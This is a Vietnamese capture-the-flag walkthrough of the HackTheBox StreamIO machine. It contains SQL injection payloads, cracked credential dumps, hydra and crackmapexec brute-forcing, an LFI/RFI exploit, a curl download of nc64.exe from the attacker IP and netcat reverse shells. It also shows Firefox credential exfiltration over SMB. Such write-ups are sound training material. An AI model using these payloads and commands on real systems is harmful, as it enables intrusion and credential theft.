# streamio-windows-medium

![https://lh7-us.googleusercontent.com/-CnEKuq7fhsS49r4hzR2i9hqW8XPTQmfBNZ0Yy6hHuQU9IygVpJjgNgD8jIb0KKogRPLnsWZXu2QLpNnHY3qjOcV90TtC9GlMZ7xD3jB_kdqJ7ol_4iuJspBuFwGyhIKjcJVz0oNDjAz](https://lh7-us.googleusercontent.com/-CnEKuq7fhsS49r4hzR2i9hqW8XPTQmfBNZ0Yy6hHuQU9IygVpJjgNgD8jIb0KKogRPLnsWZXu2QLpNnHY3qjOcV90TtC9GlMZ7xD3jB_kdqJ7ol_4iuJspBuFwGyhIKjcJVz0oNDjAz)

![https://lh7-us.googleusercontent.com/2GAmS9-iFN1sWJ22LrIDxkR9neCJdAIFeQCD61vgKp4sAcdt-2C48vtX_Ctw0zhpZUm7CMOsSiAJWKvXjy_gEhNLMZnHpRxbXbezKBH0pfpLxKUHMtuFPcHJFO4efKhSWGs-FIuyRvux](https://lh7-us.googleusercontent.com/2GAmS9-iFN1sWJ22LrIDxkR9neCJdAIFeQCD61vgKp4sAcdt-2C48vtX_Ctw0zhpZUm7CMOsSiAJWKvXjy_gEhNLMZnHpRxbXbezKBH0pfpLxKUHMtuFPcHJFO4efKhSWGs-FIuyRvux)

lưu /etc/hosts

truy cập p443: https tìm thấy /login.php

![https://lh7-us.googleusercontent.com/CZa307x7XAju_1XDgUhsdGNV4Q3PozUBALFec4R3P_geODvT3mCfcphnfw0HMH3LBPeq0XrlIP6jyVngs74poYTlb8YQbrNf7WbkHGU4lpgDs_muTmZJNmBb5GnuZ4dGM1OVrsntiUWK](https://lh7-us.googleusercontent.com/CZa307x7XAju_1XDgUhsdGNV4Q3PozUBALFec4R3P_geODvT3mCfcphnfw0HMH3LBPeq0XrlIP6jyVngs74poYTlb8YQbrNf7WbkHGU4lpgDs_muTmZJNmBb5GnuZ4dGM1OVrsntiUWK)

đăng ký được tài khoản mới nhưng ko thể đăng nhập được tài khoản đó

tìm thấy /search.php

-k : --no-tls-validation : Skip TLS certificate verification

![https://lh7-us.googleusercontent.com/cvSjbD5rweEJZvu22gJYXceV7y1yuMWKXFgTe6q0L1vpSTE-sT096JVY6fFLX4yyBCxqXZ3eelJf1gNqaMxnFLuNu9LxvTfzZh8IjDOiWpWOZvfRglG84OnwQYDLJ_eM6pMniQGjD2y9](https://lh7-us.googleusercontent.com/cvSjbD5rweEJZvu22gJYXceV7y1yuMWKXFgTe6q0L1vpSTE-sT096JVY6fFLX4yyBCxqXZ3eelJf1gNqaMxnFLuNu9LxvTfzZh8IjDOiWpWOZvfRglG84OnwQYDLJ_eM6pMniQGjD2y9)

![https://lh7-us.googleusercontent.com/YJ-P5QlrJ382U6z-gEIGm7C3rG5uUVpsTM8CsvvpG4EVKTtTjuA4f2xEtWeL5DkPWEuFsVUjnZol5467Dl0JxDf5y3pcmPiKt5s62p14MOo-fxAiRHksVFFG8mIdTMX6gv2DkBDP-BOg](https://lh7-us.googleusercontent.com/YJ-P5QlrJ382U6z-gEIGm7C3rG5uUVpsTM8CsvvpG4EVKTtTjuA4f2xEtWeL5DkPWEuFsVUjnZol5467Dl0JxDf5y3pcmPiKt5s62p14MOo-fxAiRHksVFFG8mIdTMX6gv2DkBDP-BOg)

có thể bị sqli

![https://lh7-us.googleusercontent.com/WBeOafvOAbBczC7unnAd4p1XyYbIRG_E7610mS1xBqrpv4baQet6z5_6nQt1IMwbWrmYyMsu1UqJXVa_CHLC2rZsZbnQe43RHX4dTJGgjDNybJxulwQMQe4rmZRQow1V66czu4qBzYC2](https://lh7-us.googleusercontent.com/WBeOafvOAbBczC7unnAd4p1XyYbIRG_E7610mS1xBqrpv4baQet6z5_6nQt1IMwbWrmYyMsu1UqJXVa_CHLC2rZsZbnQe43RHX4dTJGgjDNybJxulwQMQe4rmZRQow1V66czu4qBzYC2)

sử dụng sqlmap [Walk-through of StreamIO from HackTheBox - pencer.io](https://pencer.io/ctf/ctf-htb-streamio/#sqlmap)

hoặc mssql :microsoft sql [https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

tên db: STREAMIO

![https://lh7-us.googleusercontent.com/luOqs8kdjfbojqolHYMRM6AQwox8N3_DwOIVK-xUb_og2pZbaV7uIVUrFMbB1QKiSH3IRsKrMyoocXVq_wf8UIpVieoOMLy5iRGsxSalSjqBqiE3mtLolBejqDaaIIyLZo9BSEL-kfo_](https://lh7-us.googleusercontent.com/luOqs8kdjfbojqolHYMRM6AQwox8N3_DwOIVK-xUb_og2pZbaV7uIVUrFMbB1QKiSH3IRsKrMyoocXVq_wf8UIpVieoOMLy5iRGsxSalSjqBqiE3mtLolBejqDaaIIyLZo9BSEL-kfo_)

tên bảng

10'+union+select+1,(SELECT+STRING_AGG(name,+',')+name+FROM+STREAMIO..sysobjects+WHERE+xtype%3d+'U'),3,4,5,6+--+-

STRING_AGG (biểu thức, dấu phân tách) dùng để nối chuỗi

xtype=’U’ Object type. ‘user table’

![https://lh7-us.googleusercontent.com/-x8UcMcAsehxOKIOZbPrKtzt3gHXURGbA5MWQtW_zReuM3Z9Z6fMl9Gxo9g6Ep80fCvZrZLZvICGN9bl-iWo1jaoI7Hc3YBYMrGsWR-FSDnQblB7x_B1EcgQwreDlE00JexK43qmtBLR](https://lh7-us.googleusercontent.com/-x8UcMcAsehxOKIOZbPrKtzt3gHXURGbA5MWQtW_zReuM3Z9Z6fMl9Gxo9g6Ep80fCvZrZLZvICGN9bl-iWo1jaoI7Hc3YBYMrGsWR-FSDnQblB7x_B1EcgQwreDlE00JexK43qmtBLR)

các cột trong bảng users

1' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -

![https://lh7-us.googleusercontent.com/afrDVBhBJlQl2cP4grgIPjE35XFp2Tw-HSAsqoId5qpBPPopR6NeDDPASksK1ZbtOnmtha6Q69qoPtH4YsG4gcA3TcwL935O-fD0YuiCBjOdbDM_I6y2SNrwYaz_qWk1v3xCkaqOW-nt](https://lh7-us.googleusercontent.com/afrDVBhBJlQl2cP4grgIPjE35XFp2Tw-HSAsqoId5qpBPPopR6NeDDPASksK1ZbtOnmtha6Q69qoPtH4YsG4gcA3TcwL935O-fD0YuiCBjOdbDM_I6y2SNrwYaz_qWk1v3xCkaqOW-nt)

lấy thông tin cột username và password

1' UNION SELECT 1,concat(username,':',password),3,4,5,6 FROM users-- -

tìm thấy nhiều user và hash tương ứng -> decrypt hash để lấy pw plaintext

xác định loại hash:

[Hash Type Identifier - Identify unknown hashes](https://hashes.com/en/tools/hash_identifier)

![https://lh7-us.googleusercontent.com/v7OPD3RARBIp5d4atVnfzUdh7nFsKKqsW2PsOYV8F8sWeBAXOHTd1_BVMEtg5Iy-FK9rBJ0_VzBzd3UKWO96xWBXybm8W5JvLPWd3NNH4XKLRgJih32bOVcml-VR6Hiy9Lcye8XtHTtF](https://lh7-us.googleusercontent.com/v7OPD3RARBIp5d4atVnfzUdh7nFsKKqsW2PsOYV8F8sWeBAXOHTd1_BVMEtg5Iy-FK9rBJ0_VzBzd3UKWO96xWBXybm8W5JvLPWd3NNH4XKLRgJih32bOVcml-VR6Hiy9Lcye8XtHTtF)

crack:

hashcat -m 0 hash_1.txt /home/kali/Documents/wordlist/ry.txt --username --show

admin:0cc175b9c0f1b6a831c399e269772661:a

admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd

Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW

Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$

Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara

Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch

Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##

Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i

Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123

Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$

Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical

Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!

yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..

cho vào file list.txt

tách thành file username.txt và pw.txt

cut -d ":" -f1 list.txt > username.txt

cut -d ":" -f3 list.txt > pw.txt

bruteforce để đăng nhập /login.php sử dụng plugin https-post-form với mẫu của yêu cầu POST và chuỗi phản hồi mà Hydra sẽ theo dõi để xác định liệu thử nghiệm đã thất bại hay không.

hydra -L username.txt -P pw.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

![https://lh7-us.googleusercontent.com/vdwSP9Hf5x9zlbMjwlfKeWIi6cJWssj8YK_YSRYyS3YaAoLuG6KQQsfe1px9vGX-6bTDIVlr2fP7QrwBcoAxzEvp9qtne9So8hv8c_EMpFY-oRhdOK-QMmVM46pjiUHD39ESbR1j-tBt](https://lh7-us.googleusercontent.com/vdwSP9Hf5x9zlbMjwlfKeWIi6cJWssj8YK_YSRYyS3YaAoLuG6KQQsfe1px9vGX-6bTDIVlr2fP7QrwBcoAxzEvp9qtne9So8hv8c_EMpFY-oRhdOK-QMmVM46pjiUHD39ESbR1j-tBt)

![https://lh7-us.googleusercontent.com/nlAPfQO1jI3lWHzPc52yOETQIuWRXFOr31_h_UEoEPEJZZpLvPzZTgquSAr2ftD8nzlVOAAhnksZ2vPp2MI2z4bvT1DXWg4-Z5iGSakRXhPfa_INLJldeLFnoSnD-ClmnhMKzZPPfOTc](https://lh7-us.googleusercontent.com/nlAPfQO1jI3lWHzPc52yOETQIuWRXFOr31_h_UEoEPEJZZpLvPzZTgquSAr2ftD8nzlVOAAhnksZ2vPp2MI2z4bvT1DXWg4-Z5iGSakRXhPfa_INLJldeLFnoSnD-ClmnhMKzZPPfOTc)

feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

![https://lh7-us.googleusercontent.com/EM5WeOAbWqNpPn_uF2VWgEmJwETH756fwjrtic0mA_g5A1W4D1_I_Q09DxcKyQM7JsgGBDVLbyrHAbNgRA3L2IjWx8W0GQ_hvkFefCqavU2sHBP6o8UPGHznVhfLxa65lZ6vniuW5W6T](https://lh7-us.googleusercontent.com/EM5WeOAbWqNpPn_uF2VWgEmJwETH756fwjrtic0mA_g5A1W4D1_I_Q09DxcKyQM7JsgGBDVLbyrHAbNgRA3L2IjWx8W0GQ_hvkFefCqavU2sHBP6o8UPGHznVhfLxa65lZ6vniuW5W6T)

thấy thêm đường dẫn /admin/master.php có nd như sau

![https://lh7-us.googleusercontent.com/GpUdTya4QsL7XeAn1uERqinDHuNnW2gYoCEHC84wKCNTKfiH_rPAo9TGBRnPT2BrWw3wXt1sq9XVfyHDtMRQj-xtAdPfQgCOoTgGU_4YFsZg30SqWXiLuOF_aQnMTMmuNBGEl4OV1JoL](https://lh7-us.googleusercontent.com/GpUdTya4QsL7XeAn1uERqinDHuNnW2gYoCEHC84wKCNTKfiH_rPAo9TGBRnPT2BrWw3wXt1sq9XVfyHDtMRQj-xtAdPfQgCOoTgGU_4YFsZg30SqWXiLuOF_aQnMTMmuNBGEl4OV1JoL)

![https://lh7-us.googleusercontent.com/U6U7GN26FykBddsGfkn30B3y_sdn8ToHy2bej4z0Kus5kqW53NlhkdXHVLtpQh3bGagp0f2ErRCpiGivZFfNwJB_W_NhzwNu1KfaAqJeJy9wws9i9liUBnS0xz1ftjZIXVs2u2KmPC4U](https://lh7-us.googleusercontent.com/U6U7GN26FykBddsGfkn30B3y_sdn8ToHy2bej4z0Kus5kqW53NlhkdXHVLtpQh3bGagp0f2ErRCpiGivZFfNwJB_W_NhzwNu1KfaAqJeJy9wws9i9liUBnS0xz1ftjZIXVs2u2KmPC4U)

click vào các link thấy cấu trúc url dạng ?user= -> có thể bị file inclusion

tìm thêm các parameter khác:

ffuf -w /home/kali/Documents/SecLists/Discovery/Web-Content/common.txt -u https://streamio.htb/admin/index.php?FUZZ= -b PHPSESSID=1h9pkfjb9mka2a85tb16omng48 -fs 1678

![https://lh7-us.googleusercontent.com/I4U_QjblaeCEOwauEYMJrCUePMLIHPUH0dA5_ylJenGE0tSqxbdZRi1CCWKdSh8Sf8dpdYQhZWeUO2wnosP0BTHV8G__dVV_BvSxDogfeYqWr7am1oRtbsGR6cHaI0IsIte9TA9uffvd](https://lh7-us.googleusercontent.com/I4U_QjblaeCEOwauEYMJrCUePMLIHPUH0dA5_ylJenGE0tSqxbdZRi1CCWKdSh8Sf8dpdYQhZWeUO2wnosP0BTHV8G__dVV_BvSxDogfeYqWr7am1oRtbsGR6cHaI0IsIte9TA9uffvd)

![https://lh7-us.googleusercontent.com/Oo_E7rAIKAPpfxf90tM8FfpZKcpdl8t9ODOayj4MrEp4GRG9frAeW7VMmS4IGjMOkXCdVgK4CaF2I_nA26jnyUejDLk_ePTZoMOmiKcFpE7tmzVsXI7wUpQSmepLkOc2KmAbdMmMM4k0](https://lh7-us.googleusercontent.com/Oo_E7rAIKAPpfxf90tM8FfpZKcpdl8t9ODOayj4MrEp4GRG9frAeW7VMmS4IGjMOkXCdVgK4CaF2I_nA26jnyUejDLk_ePTZoMOmiKcFpE7tmzVsXI7wUpQSmepLkOc2KmAbdMmMM4k0)

thử truy cập nhưng ko thấy thông tin gì hữu ích

thử sử dụng LFI wrapper

https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php

![https://lh7-us.googleusercontent.com/2MeoZYzvpJAYxqg_aLzv1e853EzGu07YnnIGi7Cmfa7fljCuNmxPqk36AvAErlJa2dDLjMrRUsNcZvl1UZD6fW33vN9f46gbKVfVkqBazS3A8nwu4JMkxS4XUCcibRE_RDwmhqbLoD-l](https://lh7-us.googleusercontent.com/2MeoZYzvpJAYxqg_aLzv1e853EzGu07YnnIGi7Cmfa7fljCuNmxPqk36AvAErlJa2dDLjMrRUsNcZvl1UZD6fW33vN9f46gbKVfVkqBazS3A8nwu4JMkxS4XUCcibRE_RDwmhqbLoD-l)

decode base64 output

```html
<?php
if(!defined('included'))
die("Only accessable through includes");

...

<?php
if(isset($_POST!['include']))
{
if($_POST!['include'] !== "index.php" )
eval(**file_get_contents**($_POST!['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

code cho thấy có lỗi RFI

![https://lh7-us.googleusercontent.com/9fCbUivJJCNkKH_m9BP3uQeFW9FqoiFdJdMu8su7m60k58B3xvsUHdVIUn1yKIrpRlIx_Iwn4uoOC3oCiDVKwcX9WMML_sXC0CasVgqLGF23LTkr_25spbxSazLSn4sFEQ3lApSp3GQP](https://lh7-us.googleusercontent.com/9fCbUivJJCNkKH_m9BP3uQeFW9FqoiFdJdMu8su7m60k58B3xvsUHdVIUn1yKIrpRlIx_Iwn4uoOC3oCiDVKwcX9WMML_sXC0CasVgqLGF23LTkr_25spbxSazLSn4sFEQ3lApSp3GQP)

cần sử dụng method post

![https://lh7-us.googleusercontent.com/2btgH6tIaqx4WsRHgArQ2DuP2vzHPE1VVg7PGaa330tUvQb0O5vlciuJdRRCV2teoU7_SR-sPM-OM5TFNLRVT5cf04R5ITsY8ZFi-RVHdDlYanAPEBx7mB8SAqAp1GK4h8ho1aXojm8p](https://lh7-us.googleusercontent.com/2btgH6tIaqx4WsRHgArQ2DuP2vzHPE1VVg7PGaa330tUvQb0O5vlciuJdRRCV2teoU7_SR-sPM-OM5TFNLRVT5cf04R5ITsY8ZFi-RVHdDlYanAPEBx7mB8SAqAp1GK4h8ho1aXojm8p)

dựng PoC và execute thấy kết quả của whoami là yoshihide

→ tạo reverse shell

curl 10.10.16.7/nc64.exe -o c:\\windows\\temp\\nc64.exe

![https://lh7-us.googleusercontent.com/VJ2k71-QRXtn42DRiwKbKINTnlGa13dYMaalO31xtJF6JPloBYKTWNMtTE8eIRD-D5sXsBleectKLuaDZW7g0q2761fZkmWyGSdbocfnW9MorO17u_VCZXEhQorDLmjv6A-osTKbdCo6](https://lh7-us.googleusercontent.com/VJ2k71-QRXtn42DRiwKbKINTnlGa13dYMaalO31xtJF6JPloBYKTWNMtTE8eIRD-D5sXsBleectKLuaDZW7g0q2761fZkmWyGSdbocfnW9MorO17u_VCZXEhQorDLmjv6A-osTKbdCo6)

nd file test.php đổi thành system(‘c:\\windows\\temp\\nc64.exe 10.10.16.7 4444 -e cmd.exe’)

send request và lắng nghe -> có được shell của yoshihide

![https://lh7-us.googleusercontent.com/IgO6q-Le59srG9Ozln_VXsolAkAUhR_Ud8uYL4ogTl0DOlo_IN-ahQMEINaqu1At8faDfAr_8cm7MxeqROq7zAcHOC9avZo2zOQzAMQsqP6-tzY4IqthpTFKA1pDRsImkXLAE5N4q5qk](https://lh7-us.googleusercontent.com/IgO6q-Le59srG9Ozln_VXsolAkAUhR_Ud8uYL4ogTl0DOlo_IN-ahQMEINaqu1At8faDfAr_8cm7MxeqROq7zAcHOC9avZo2zOQzAMQsqP6-tzY4IqthpTFKA1pDRsImkXLAE5N4q5qk)

![https://lh7-us.googleusercontent.com/5MdLGMgjKKegeVmmH-L2kTCdSGWZyHpS56rA73vw4-oCTDFDcoTDTrcotHKgWTa9Xx6tcWGodTIWzl76t2dgyPGCjBTylZSDN1foHucq_kP6vZTNPjRl1MkmQDnMozYZKvr1N8l9po5u](https://lh7-us.googleusercontent.com/5MdLGMgjKKegeVmmH-L2kTCdSGWZyHpS56rA73vw4-oCTDFDcoTDTrcotHKgWTa9Xx6tcWGodTIWzl76t2dgyPGCjBTylZSDN1foHucq_kP6vZTNPjRl1MkmQDnMozYZKvr1N8l9po5u)

tìm thấy cred trong file index.php tại thư mục này

$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');

sử dụng sqlcmd và query data

sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name FROM master..sysdatabases;'

nhưng ko thấy thực thi thành công

![https://lh7-us.googleusercontent.com/vAymkUYI8ldw4v25AG_U9rwn22vSC_wLN1gnmm_rC-7ZvwYTnhsOr6WXaqkz4TkgGJt1zBn3Rm0fTPZCJGwD-IDANh2__leytEefKkZ-FNOiG2TSg3Wcnw8wXYZjPB1QKRT5ZZYj_3M0](https://lh7-us.googleusercontent.com/vAymkUYI8ldw4v25AG_U9rwn22vSC_wLN1gnmm_rC-7ZvwYTnhsOr6WXaqkz4TkgGJt1zBn3Rm0fTPZCJGwD-IDANh2__leytEefKkZ-FNOiG2TSg3Wcnw8wXYZjPB1QKRT5ZZYj_3M0)

→ chuyển sang powershell

![https://lh7-us.googleusercontent.com/h65xehdoMX7W_AlwLYJQWK5kVEE1ORDc4pUjR_HovFBaedLhOhspdvws_YMvmo66Zkwcyx_VGh9rpRd6UhceEGTbD0_6GD1sEEMrWS0i6WQAihogroFXKe5DE1gWb0w2qO2DUS4G92Oj](https://lh7-us.googleusercontent.com/h65xehdoMX7W_AlwLYJQWK5kVEE1ORDc4pUjR_HovFBaedLhOhspdvws_YMvmo66Zkwcyx_VGh9rpRd6UhceEGTbD0_6GD1sEEMrWS0i6WQAihogroFXKe5DE1gWb0w2qO2DUS4G92Oj)

sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM streamio_backup..sysobjects WHERE xtype = "U"'

![https://lh7-us.googleusercontent.com/h0-DxhEFV2WIJOA4C9g8OUbxJEeKtsxulZz-wOhIUqTdg0gVYlD1ZikHULeOVqWrowU1vFfnKjOkxGlqdXp7RAOVL2eglfdxgtUy5y10GxTHolwCqSrAhP0Ik4uGwFTcihMIpORW5dMP](https://lh7-us.googleusercontent.com/h0-DxhEFV2WIJOA4C9g8OUbxJEeKtsxulZz-wOhIUqTdg0gVYlD1ZikHULeOVqWrowU1vFfnKjOkxGlqdXp7RAOVL2eglfdxgtUy5y10GxTHolwCqSrAhP0Ik4uGwFTcihMIpORW5dMP)

sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users;'

![https://lh7-us.googleusercontent.com/Zf_SjmfQ05jM6es3wI1rZ55KJXOBjdxK_o3A8druRbjICugS3F_w6AB1vrzi1FGNg1ZyEsVX6M5_qT-2y1OVBtxffRKJ47AU6PfKgMSiCvI8KkWPYBO8yZUKBQe4zFZNChHRt4owuapO](https://lh7-us.googleusercontent.com/Zf_SjmfQ05jM6es3wI1rZ55KJXOBjdxK_o3A8druRbjICugS3F_w6AB1vrzi1FGNg1ZyEsVX6M5_qT-2y1OVBtxffRKJ47AU6PfKgMSiCvI8KkWPYBO8yZUKBQe4zFZNChHRt4owuapO)

thấy 2 user dưới thuộc domain user

![https://lh7-us.googleusercontent.com/wzforzP3a11DnIttqcucoKxlqJahe1PejcI7y0-j3dMJIF_OnQ9ORjZDf1cTofo1LzjfS0E9ZPOLVvoloPA2mzT7acQq5GFqZ7ZjYf3SbTZnDI0ktCJh_b3cZvt06IrRtHuEQ-yajmOF](https://lh7-us.googleusercontent.com/wzforzP3a11DnIttqcucoKxlqJahe1PejcI7y0-j3dMJIF_OnQ9ORjZDf1cTofo1LzjfS0E9ZPOLVvoloPA2mzT7acQq5GFqZ7ZjYf3SbTZnDI0ktCJh_b3cZvt06IrRtHuEQ-yajmOF)

ngoài ra nikk37 còn là remote management use

![https://lh7-us.googleusercontent.com/zBmgErCBiS21d4Y4zkhX15MVsFyEoXuIeanS7ZyyqyK4F0HOa8sId2UeCajwh2Y5USgK8Tq6JmenIRoRMx01tELl_73djTxI65B0gTTQx7MUIuQCAbekYo1io6Fp-FDSDGcz3zF90Gya](https://lh7-us.googleusercontent.com/zBmgErCBiS21d4Y4zkhX15MVsFyEoXuIeanS7ZyyqyK4F0HOa8sId2UeCajwh2Y5USgK8Tq6JmenIRoRMx01tELl_73djTxI65B0gTTQx7MUIuQCAbekYo1io6Fp-FDSDGcz3zF90Gya)

còn lại đều

![https://lh7-us.googleusercontent.com/0ZxlAk6Nay8awXzvZHXXX6OocI6yA0cp109DwG4vVuBG1Qf5ZHM36lIBcet4V18KD-G-RlsY6zb1-y9yIefECvd6FCg6SRewqBtTw5OtZhuEBIS0HfIHD0XkCxEt9sqnCKWikZzFhP6i](https://lh7-us.googleusercontent.com/0ZxlAk6Nay8awXzvZHXXX6OocI6yA0cp109DwG4vVuBG1Qf5ZHM36lIBcet4V18KD-G-RlsY6zb1-y9yIefECvd6FCg6SRewqBtTw5OtZhuEBIS0HfIHD0XkCxEt9sqnCKWikZzFhP6i)

crack pw của nikk37

![https://lh7-us.googleusercontent.com/T-pclPFx8rfF08N3SP0vEFVn1-IV8yJLZpEpTpQTLh37f77cno2CdIJpmaWRfHjV0LiH8glYs1mogJlvgsw8h4ny9G_TmKNBgp9ZkatFEBH_7eYWdXA0lwuY1e87_dXsD8hbyvTrN7a_](https://lh7-us.googleusercontent.com/T-pclPFx8rfF08N3SP0vEFVn1-IV8yJLZpEpTpQTLh37f77cno2CdIJpmaWRfHjV0LiH8glYs1mogJlvgsw8h4ny9G_TmKNBgp9ZkatFEBH_7eYWdXA0lwuY1e87_dXsD8hbyvTrN7a_)

sử sụng crackmapexec for  discover and enumerate information on remote machines.

phát hiện truy cập đc smb và list được các thư mục share nhưng đều là default nên ko khai thác đc tiếp

thử với winrm ok

crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'

![https://lh7-us.googleusercontent.com/UPyfowFP_1dEcP4LZ1qI9Ynya6pnEQp1hG_kCn9QHqIZ5admXk7RKQebC7yH_qs3NG1juDWQFu4JxD-7KCkh5myYu5oqL8fa9eeZi4X0PBEL7MNEcnqg_UWN6AaduF5prgfPtvRMvltL](https://lh7-us.googleusercontent.com/UPyfowFP_1dEcP4LZ1qI9Ynya6pnEQp1hG_kCn9QHqIZ5admXk7RKQebC7yH_qs3NG1juDWQFu4JxD-7KCkh5myYu5oqL8fa9eeZi4X0PBEL7MNEcnqg_UWN6AaduF5prgfPtvRMvltL)

sử dụng evil-winrm để provides remote shell access to Windows machines over WinRM (Windows Remote Management).

![https://lh7-us.googleusercontent.com/l80szWx8vMTTc6mMELExdY6PGsnYQvTjIRKXb86Dqk6BhDQgT9bNO7wTXu7hXBAeJcwvVbQnVdmQPYjh-59NPn_bMMlHJOeiROtDlXRu2a10KYR6hXjxUbeQsCDsvzjmde4WOjbn4N_x](https://lh7-us.googleusercontent.com/l80szWx8vMTTc6mMELExdY6PGsnYQvTjIRKXb86Dqk6BhDQgT9bNO7wTXu7hXBAeJcwvVbQnVdmQPYjh-59NPn_bMMlHJOeiROtDlXRu2a10KYR6hXjxUbeQsCDsvzjmde4WOjbn4N_x)

![https://lh7-us.googleusercontent.com/24CjHc-VHn3BLLOG4oLCZHjtHbO0jawx_fkCWgtgGJK2bcCvTWEgmttIVV_FGr3snh4ojEjsXSdvI-USV59jQ_2SrU5Kn3oMzYRfWgn_JsO8b-8Cz-tCqZCoRtVLIgQ1WSK9ee3wKckl](https://lh7-us.googleusercontent.com/24CjHc-VHn3BLLOG4oLCZHjtHbO0jawx_fkCWgtgGJK2bcCvTWEgmttIVV_FGr3snh4ojEjsXSdvI-USV59jQ_2SrU5Kn3oMzYRfWgn_JsO8b-8Cz-tCqZCoRtVLIgQ1WSK9ee3wKckl)

chuyển sang shell khác cho dễ thao tác

tạo kết nối smb impacket-smbserver share . -smb2support

từ victim kiểm tra net view \\10.10.16.7\share

từ victim netcat

\\10.10.16.7\share\nc64.exe 10.10.16.7 4449 -e cmd

và lắng nghe bên attack

![https://lh7-us.googleusercontent.com/IbtapN0wHS0kzxOResgcrY7QUc4DSFCh64N44cEm6VpFyXLRS_u-Sf36AF_8GBuIvn0y3IGfqgkhEgg7lKhteJz63wcE-sXp5p6vjeVYtMMRMUKm-e4KDo2uE71Ocgs4W9jlyNyqcWZM](https://lh7-us.googleusercontent.com/IbtapN0wHS0kzxOResgcrY7QUc4DSFCh64N44cEm6VpFyXLRS_u-Sf36AF_8GBuIvn0y3IGfqgkhEgg7lKhteJz63wcE-sXp5p6vjeVYtMMRMUKm-e4KDo2uE71Ocgs4W9jlyNyqcWZM)

c1: sử dụng winpeas tìm cve/data sensitive …

copy file winpeasx86 sang victim

copy \\10.10.16.7\share\winPEASx86.exe

run winPEASx86.exe

![https://lh7-us.googleusercontent.com/LBwea4etNS9PmLgPrlDMnBWCN3rTHtR8Lponpllv7KUqVXnyMQLQmP2Pl0Bim_wDfxfdNTUu4i1DqzTz-qwzuSB89v6HH9e5CbGjMhcq9k0DuIM5NCBRb4lagJjwMjBNXWfwAamteHll](https://lh7-us.googleusercontent.com/LBwea4etNS9PmLgPrlDMnBWCN3rTHtR8Lponpllv7KUqVXnyMQLQmP2Pl0Bim_wDfxfdNTUu4i1DqzTz-qwzuSB89v6HH9e5CbGjMhcq9k0DuIM5NCBRb4lagJjwMjBNXWfwAamteHll)

tìm thấy 4 cred trên firefox

![https://lh7-us.googleusercontent.com/gC0Lge8dllDG23Ee5Hv3uwVDmRpsh4iA8KdKzvO9biygctGgt1tqyT8yHlYzb3-uwFHd6mwFuoYb69FqMVdleKv0QCfGjv8cA15u4cZVvhe4r1QfwSxh7eOPP1GyWxFmortunEvmt6jf](https://lh7-us.googleusercontent.com/gC0Lge8dllDG23Ee5Hv3uwVDmRpsh4iA8KdKzvO9biygctGgt1tqyT8yHlYzb3-uwFHd6mwFuoYb69FqMVdleKv0QCfGjv8cA15u4cZVvhe4r1QfwSxh7eOPP1GyWxFmortunEvmt6jf)

c2: exfiltration thấy có sử dụng firefox -> tìm thấy một vài file có khả năng chứa thông tin như key4.db và logins.json

net use \\10.10.16.7\share

![https://lh7-us.googleusercontent.com/ntqihxj9ZcVgqrKcH7QBaH71mesKqerlRX4wqnjEgAmY1PwIMVqi4TvpSx3v-Mdh3WwE2sq6fTsz0cs2qRLPVJQzPu88EMCuYTXIcQiQYZOcRCc1PgEzlRNBrZIekosOLK27czIcPZZe](https://lh7-us.googleusercontent.com/ntqihxj9ZcVgqrKcH7QBaH71mesKqerlRX4wqnjEgAmY1PwIMVqi4TvpSx3v-Mdh3WwE2sq6fTsz0cs2qRLPVJQzPu88EMCuYTXIcQiQYZOcRCc1PgEzlRNBrZIekosOLK27czIcPZZe)

copy 2 file key4.db và logins.json sang kali

run exploit firepwd.py để decrypt

![https://lh7-us.googleusercontent.com/oMWDa6UErj3cIB3rs6ejHwRw2ckVMxaSCdC_fhud8BdF-z44MZEufTLDD8Pc9z-3R-XnrumSgqoSKLRe4Yz3V9uVtil8M9iAz_oyR9zRXyFPHbO3ExHizoMAEoYgvoV_da6MvYPDJZIp](https://lh7-us.googleusercontent.com/oMWDa6UErj3cIB3rs6ejHwRw2ckVMxaSCdC_fhud8BdF-z44MZEufTLDD8Pc9z-3R-XnrumSgqoSKLRe4Yz3V9uVtil8M9iAz_oyR9zRXyFPHbO3ExHizoMAEoYgvoV_da6MvYPDJZIp)

sử dụng crackmapexec để  bruteforce login

crackmapexec smb streamio.htb -u user.txt -p pw.txt

